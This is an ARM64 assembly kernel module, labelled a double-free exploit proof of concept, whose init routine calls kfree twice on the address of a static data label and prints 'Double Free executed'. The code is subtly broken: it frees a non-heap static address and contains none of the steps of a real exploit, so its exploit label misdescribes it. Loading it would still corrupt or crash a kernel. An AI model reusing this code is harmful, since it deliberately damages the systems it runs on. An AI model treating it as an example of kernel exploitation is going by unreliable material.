/*
 * double_free_kernel_exploit.s - Kernel Double Free Exploit POC.
 *
 * This module simulates a double-free by calling a dummy kfree routine twice on the same pointer.
 *
 * WARNING: Extremely dangerous; for demonstration in a controlled environment only.
 */
.extern printk
/* Assume an external kfree is available for demonstration */
.section .data
dummy_ptr:
    .quad 0x1122334455667788

.section .text
.global init_module
.global cleanup_module
init_module:
    ldr x0, =dummy_ptr
    bl kfree
    ldr x0, =dummy_ptr
    bl kfree
    ldr x0, =kdf_msg_activated
    bl printk
    mov x0, #0
    ret
cleanup_module:
    ldr x0, =kdf_msg_deactivated
    bl printk
    ret
.section .rodata
kdf_msg_activated:
    .asciz "Kernel Exploit: Double Free executed\n"
kdf_msg_deactivated:
    .asciz "Kernel Exploit: Double Free module deactivated\n"
